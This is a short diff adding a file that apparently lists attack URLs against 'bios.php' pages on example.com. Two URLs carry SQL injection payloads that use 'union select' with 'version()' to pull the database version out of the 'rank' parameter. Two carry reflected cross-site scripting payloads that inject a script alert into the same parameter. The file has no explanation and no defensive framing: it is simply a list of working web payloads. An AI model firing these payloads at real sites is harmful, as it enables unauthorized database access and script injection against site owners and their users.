@@ -1,0 +1,7 @@
+http://www.example.com/tallestbuildings/bios.php?rank=1+and+1=null+union+select+1,version(),3,4,5,6,7,8,9--
+http://www.example.com/presidents/bios.php?rank=-1%20union%20all%20select%201,version(),3,4,5,6,7,8,9,10%20from%20presidents
+
+
+http://www.example.com/tallestbuildings/bios.php?rank=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E
+http://www.example.com/presidents/bios.php?rank=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E
+
